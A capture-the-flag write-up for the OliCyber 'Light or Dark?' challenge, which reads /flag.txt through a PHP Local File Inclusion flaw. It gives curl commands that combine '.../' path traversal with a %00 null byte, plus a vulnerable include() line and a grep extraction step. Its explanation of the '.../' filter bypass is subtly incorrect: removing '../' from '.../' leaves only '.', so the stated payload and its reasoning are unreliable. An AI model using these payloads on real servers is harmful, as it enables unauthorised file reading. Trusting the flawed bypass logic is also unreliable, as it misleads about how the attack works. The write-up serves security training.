# Light or Dark?

**Competition:** OliCyber<br>
**Category:** Web / Local File Inclusion<br>
**URL:** http://lightdark.challs.olicyber.it

---

## Description

> A simple website that allows you to choose between light theme, dark theme and... nah, just these two.

A site vulnerable to LFI with null byte injection. The flag is located in `/flag.txt`.

**Note:** PHP version: 4

---

## Solution

### Step 1 — Vulnerability Analysis

The site allows you to select a theme via the GET parameter `tema`:

```
http://lightdark.challs.olicyber.it/index.php?tema=dark
```

The server dynamically includes a CSS file based on the passed value. This pattern is classically vulnerable to **Local File Inclusion (LFI)**: if the parameter is not sanitized, an attacker can manipulate it to include arbitrary files from the server's filesystem.

The hint about **PHP version 4** is crucial: in PHP versions prior to 5.3.4, the `include()` function is vulnerable to **Null Byte Injection** (`%00`). By inserting a null byte at the end of the path, you truncate the string before any suffix added by the server (e.g., `.css`), thus bypassing the extension check.

---

### Step 2 — LFI Verification with Path Traversal

We try to traverse up the root directory with `.../` sequences to bypass naive filters that remove `../`:

```bash
curl -s 'http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css'
```

The null byte (`%00`) truncates the string: the server includes `/flag.txt` ignoring the `.css` suffix. The flag is injected directly into the `<style>` block of the HTML page:

```html
<style>
    flag{...}
</style>
```

---

### Step 3 — Flag Extraction

```bash
curl -s 'http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css' \
  | grep -oiP 'flag\{[^}]+\}'
```

**Output:**
```
flag{...}
```

---

## Vulnerabilities Exploited

| Aspect | Detail |
|---|---|
| **Type** | Local File Inclusion (LFI) |
| **Root Cause** | Parameter `tema` passed directly to `include()` without sanitization |
| **Filter Bypass** | Sequence `.../` to elude naive removals of `../` |
| **Extension Bypass** | Null Byte Injection `%00` (works on PHP < 5.3.4) |
| **Impact** | Reading arbitrary files from the server's filesystem |

---

### Why `.../` instead of `../`?

Some filters remove the `../` sequence from the parameter. The `.../` sequence is not recognized as path traversal by the filter, but after removing `../` from `.../` a `./` remains → the path is still traversed.

---

### Why does the Null Byte work?

In PHP < 5.3.4, C strings terminate at the first `\0` byte. If the server constructs the path like this:

```php
include("themes/" . $_GET['tema'] . ".css");
```

The value `../flag.txt%00.css` is internally interpreted as `../flag.txt` because the null byte truncates the string before `.css`.

---

## Conclusions

- Never concatenate user input directly to file paths
- Use a whitelist of allowed values instead of filtering input
- Don't rely on filters that remove sequences — use canonical paths
- Validate file extension after traversal, not before
- In modern PHP the null byte injection is mitigated, but the principle remains
- Always sanitize and validate input, especially for filesystem operations